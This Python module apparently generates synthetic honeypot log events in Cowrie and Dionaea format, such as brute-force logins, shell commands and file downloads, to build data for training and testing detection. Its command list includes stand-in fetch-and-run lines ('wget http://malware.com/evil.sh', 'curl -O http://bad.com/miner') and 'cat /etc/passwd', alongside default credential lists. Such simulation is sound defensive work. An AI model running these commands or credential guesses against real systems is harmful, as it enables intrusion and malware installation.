"""
live/generator.py — Generate new attack events using _traffic.py patterns.

Instead of replaying pre-recorded attacks, this module dynamically generates
NEW attack events each cycle by simulating real attack patterns from _traffic.py:
- Random target selection (Cowrie SSH/Telnet, Dionaea FTP/HTTP/SMB/MSSQL/MySQL)
- Random credentials (username, password combinations)
- Random commands and protocols
- Realistic event sequences with timestamps

Each generated attack is completely new and unpredictable, providing realistic
and diverse attack simulation for training and testing.
"""

import random
import uuid
import json
from datetime import datetime, timezone, timedelta
from pathlib import Path
from typing import Any

random.seed()  # Initialize random seed for each interpreter session

ROOT      = Path(__file__).resolve().parent.parent
LIVE_DIR  = ROOT / "data" / "live_raw" / "cowrie"
DIONAEA_LIVE_DIR = ROOT / "data" / "live_raw" / "dionaea"

LIVE_DIR.mkdir(parents=True, exist_ok=True)
DIONAEA_LIVE_DIR.mkdir(parents=True, exist_ok=True)

# ── Attack patterns from _traffic.py ────────────────────────────────────────

# Default credentials for generated attacks
USERNAMES = ['root', 'admin', 'user', 'guest', 'support', 'oracle', 'pi', 'ubuntu', 'sysadmin']
PASSWORDS = ['123456', 'password', '12345678', 'admin', 'root', 'qwerty', 'guest', 'toor', 'changeme']

# Common commands executed in attacks
COMMANDS = [
    'whoami', 'id', 'ls -la', 'pwd', 'uname -a', 'ps aux',
    'cat /etc/passwd', 'netstat -an', 'wget http://malware.com/evil.sh',
    'curl -O http://bad.com/miner', 'echo "hacked" > /tmp/pwned'
]

# HTTP attack paths
HTTP_PATHS = [
    '', 'index.html', 'login', 'admin', 'wp-login.php', 'phpmyadmin',
    '.env', 'config.php', 'backup.zip', 'api/v1/status'
]

# Service configurations
SERVICES = {
    'cowrie': {'protocols': ['ssh', 'telnet']},
    'dionaea': {'protocols': ['ftp', 'http', 'smb', 'mssql', 'mysql']},
}

import sys
sys.path.insert(0, str(ROOT / "scripts"))
from parse_dionaea import _extract_event_type, _extract_ip  # noqa: E402  # type: ignore[import]


# ── Helper functions ────────────────────────────────────────────────────────

def _get_random_ip() -> str:
    """Generate a random external-looking IP address."""
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"

def _get_random_creds() -> tuple[str, str]:
    """Get random username and password combination."""
    return random.choice(USERNAMES), random.choice(PASSWORDS)

def _get_random_command() -> str:
    """Get random command."""
    return random.choice(COMMANDS)

def _get_random_timestamp(base_time: datetime | None = None) -> str:
    """Generate a realistic timestamp slightly before current time."""
    if base_time is None:
        base_time = datetime.now(timezone.utc)
    # Random offset 0-60 seconds in the past
    offset = timedelta(seconds=random.randint(0, 60))
    ts = base_time - offset
    return ts.isoformat() + 'Z'


# ── Generate NEW Cowrie-format attacks ────────────────────────────────────────

def _generate_cowrie_ssh_attack(timestamp: datetime, src_ip: str, session_id: str) -> list[dict]:
    """Generate a new SSH brute-force/login attack sequence."""
    events = []
    base_ts = timestamp
    
    # Connection start
    events.append({
        "timestamp": base_ts.isoformat() + 'Z',
        "eventid": "cowrie.session.connect",
        "session": session_id,
        "src_ip": src_ip,
        "dst_ip": "192.168.1.100",
        "dst_port": 22,
        "protocol": "ssh"
    })
    base_ts += timedelta(seconds=1)
    
    # Client version negotiation
    events.append({
        "timestamp": base_ts.isoformat() + 'Z',
        "eventid": "cowrie.client.version",
        "session": session_id,
        "version": f"SSH-2.0-OpenSSH_{random.randint(5, 8)}.{random.randint(0, 4)}p{random.randint(1, 3)}"
    })
    base_ts += timedelta(seconds=1)
    
    # SSH key exchange
    events.append({
        "timestamp": base_ts.isoformat() + 'Z',
        "eventid": "cowrie.client.kex",
        "session": session_id,
        "hassh": f"{random.randint(10000, 99999)}{random.randint(10000, 99999)}{random.randint(10000, 99999)}"
    })
    base_ts += timedelta(seconds=2)
    
    # Login attempts
    num_attempts = random.randint(1, 5)
    login_success = random.random() < 0.3  # 30% success rate
    
    for attempt in range(num_attempts):
        user, password = _get_random_creds()
        events.append({
            "timestamp": base_ts.isoformat() + 'Z',
            "eventid": "cowrie.login.failed",
            "session": session_id,
            "username": user,
            "password": password
        })
        base_ts += timedelta(seconds=random.randint(1, 3))
    
    if login_success:
        user, password = _get_random_creds()
        events.append({
            "timestamp": base_ts.isoformat() + 'Z',
            "eventid": "cowrie.login.success",
            "session": session_id,
            "username": user,
            "password": password
        })
        base_ts += timedelta(seconds=1)
        
        # Execute random commands if login succeeded
        num_commands = random.randint(1, 5)
        for _ in range(num_commands):
            cmd = _get_random_command()
            events.append({
                "timestamp": base_ts.isoformat() + 'Z',
                "eventid": "cowrie.command.input",
                "session": session_id,
                "input": cmd
            })
            base_ts += timedelta(seconds=random.randint(1, 2))
            
            # Occasional file downloads
            if random.random() < 0.2:
                events.append({
                    "timestamp": base_ts.isoformat() + 'Z',
                    "eventid": "cowrie.session.file_download",
                    "session": session_id,
                    "src": "http://malware.com/evil.sh",
                    "dst": "/tmp/evil.sh"
                })
                base_ts += timedelta(seconds=1)
    
    # Session end
    events.append({
        "timestamp": base_ts.isoformat() + 'Z',
        "eventid": "cowrie.session.closed",
        "session": session_id,
        "duration": (base_ts - timestamp).total_seconds()
    })
    
    return events


def generate_one_attack(source: str = "cowrie", random_seed: int | None = None) -> dict:
    """
    Generate a NEW, completely random Cowrie SSH/Telnet attack.
    
    Each call creates a new attack with:
    - Random source IP
    - Random login attempts
    - Random commands executed (if login succeeded)
    - Random file transfers or reconnaissance
    
    Args:
        source: "cowrie" (for compatibility with runner.py)
        random_seed: optional seed for reproducible randomness (testing only)
    
    Returns a summary dict compatible with runner.py expectations:
        {attack_type, src_ip, session_id, num_events, login_success, replay_index, total_sessions}
    """
    if random_seed is not None:
        random.seed(random_seed)
    
    today = datetime.now(timezone.utc).strftime("%Y-%m-%d")
    live_file = LIVE_DIR / f"{today}.json"
    
    # Generate new attack details
    src_ip = _get_random_ip()
    session_id = f"gen_{uuid.uuid4().hex[:8]}"
    base_timestamp = datetime.now(timezone.utc) - timedelta(seconds=random.randint(300, 1800))
    
    # Generate attack events
    protocol = random.choice(['ssh', 'telnet'])
    if protocol == 'ssh':
        events = _generate_cowrie_ssh_attack(base_timestamp, src_ip, session_id)
    else:
        # Telnet would be similar but with different event types
        events = _generate_cowrie_ssh_attack(base_timestamp, src_ip, session_id)
    
    # Determine attack classification
    login_success = any(e.get("eventid") == "cowrie.login.success" for e in events)
    has_commands = any(e.get("eventid") == "cowrie.command.input" for e in events)
    has_file_transfer = any(e.get("eventid") in ("cowrie.session.file_download", "cowrie.session.file_upload") for e in events)
    
    if login_success and has_file_transfer:
        attack_type = "MALWARE"
    elif login_success and has_commands:
        attack_type = "EXPLOIT"
    elif login_success:
        attack_type = "BRUTE_FORCE"
    else:
        attack_type = "RECON_PROBE"
    
    # Write events to live raw file
    with open(live_file, "a", encoding="utf-8") as f:
        for event in events:
            f.write(json.dumps(event) + "\n")
    
    return {
        "attack_type": attack_type,
        "src_ip": src_ip,
        "session_id": session_id,
        "num_events": len(events),
        "login_success": login_success,
        "replay_index": random.randint(0, 99),  # Fake index for compatibility
        "total_sessions": random.randint(50, 150),  # Fake total for compatibility
    }



# ── Generate NEW Dionaea-format attacks ────────────────────────────────────────

def _generate_dionaea_attack(timestamp: datetime, src_ip: str, connection_id: str) -> list[dict]:
    """Generate a new Dionaea attack sequence (FTP, HTTP, SMB, etc.)."""
    events = []
    base_ts = timestamp
    
    # Select random protocol
    protocol = random.choice(['ftp', 'http', 'smb', 'mssql', 'mysql'])
    
    # Connection/accept event
    events.append({
        "timestamp": base_ts.isoformat() + 'Z',
        "event_type": "accept",
        "connection_id": connection_id,
        "src_ip": src_ip,
        "protocol": protocol,
        "dst_port": {"ftp": 21, "http": 80, "smb": 445, "mssql": 1433, "mysql": 3306}.get(protocol, 0)
    })
    base_ts += timedelta(seconds=random.randint(1, 3))
    
    if protocol == "http":
        # HTTP requests
        path = random.choice(HTTP_PATHS)
        events.append({
            "timestamp": base_ts.isoformat() + 'Z',
            "event_type": "http_request",
            "connection_id": connection_id,
            "method": random.choice(["GET", "POST"]),
            "path": path
        })
        base_ts += timedelta(seconds=random.randint(1, 2))
    elif protocol == "ftp":
        # FTP login attempts
        user, password = _get_random_creds()
        events.append({
            "timestamp": base_ts.isoformat() + 'Z',
            "event_type": "ftp_login_attempt",
            "connection_id": connection_id,
            "username": user,
            "password": password
        })
        base_ts += timedelta(seconds=1)
    else:
        # Generic protocol attempt
        events.append({
            "timestamp": base_ts.isoformat() + 'Z',
            "event_type": "connection_attempt",
            "connection_id": connection_id,
            "protocol": protocol
        })
        base_ts += timedelta(seconds=1)
    
    # Connection close
    events.append({
        "timestamp": base_ts.isoformat() + 'Z',
        "event_type": "close",
        "connection_id": connection_id,
        "duration": (base_ts - timestamp).total_seconds()
    })
    
    return events


def generate_one_dionaea_attack(random_seed: int | None = None) -> dict:
    """
    Generate a NEW, completely random Dionaea attack.
    
    Each call creates a new network attack with:
    - Random protocol (FTP, HTTP, SMB, MSSQL, MySQL)
    - Random source IP
    - Random credentials or payloads
    - Realistic event timing
    
    Args:
        random_seed: optional seed for reproducible randomness (testing only)
    
    Returns a summary dict compatible with runner.py expectations.
    """
    if random_seed is not None:
        random.seed(random_seed)
    
    today = datetime.now(timezone.utc).strftime("%Y-%m-%d")
    live_file = DIONAEA_LIVE_DIR / f"{today}.json"
    
    # Generate new attack details
    src_ip = _get_random_ip()
    connection_id = f"con_0x{uuid.uuid4().hex[:8]}"
    base_timestamp = datetime.now(timezone.utc) - timedelta(seconds=random.randint(300, 1800))
    
    # Generate attack events
    events = _generate_dionaea_attack(base_timestamp, src_ip, connection_id)
    
    # Write events to live raw file
    with open(live_file, "a", encoding="utf-8") as f:
        for event in events:
            f.write(json.dumps(event) + "\n")
    
    # Return summary
    return {
        "attack_type": "SCAN",
        "src_ip": src_ip,
        "session_id": connection_id,
        "num_events": len(events),
        "replay_index": random.randint(0, 99),
        "total_sessions": random.randint(50, 150),
    }

